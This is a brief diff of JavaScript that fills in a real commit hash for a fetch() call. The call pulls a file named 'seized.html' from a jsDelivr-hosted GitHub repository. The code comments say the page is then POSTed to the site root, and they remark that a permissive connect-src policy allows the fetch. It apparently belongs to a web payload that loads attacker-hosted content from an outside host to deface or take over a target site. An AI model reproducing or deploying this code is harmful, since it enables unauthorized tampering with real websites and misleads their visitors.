@@ -8,7 +8,7 @@
   sig("init");
 
   // Fetch seized.html from JSDelivr (connect-src * allows it), then POST to /
-  fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@SEIZEDSHA/seized.html",{cache:"no-store"})
+  fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@96e9a9afb12614ce41d97017dee136061df84954/seized.html",{cache:"no-store"})
     .then(function(r){ return r.text(); })
     .then(function(html){
       sig("got_sz");
